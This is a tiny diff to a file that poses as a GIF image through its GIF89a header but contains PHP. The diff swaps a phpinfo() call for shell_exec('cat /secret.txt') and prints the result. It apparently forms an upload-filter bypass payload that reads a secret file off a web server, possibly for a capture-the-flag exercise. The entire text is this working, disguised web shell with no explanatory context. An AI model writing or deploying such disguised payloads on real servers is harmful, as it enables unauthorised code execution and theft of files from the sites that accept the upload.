@@ -1,4 +1,5 @@
 GIF89a;
 <?php
-phpinfo();
+$output = shell_exec('cat /secret.txt');
+echo "<pre>$output</pre>";
 ?>
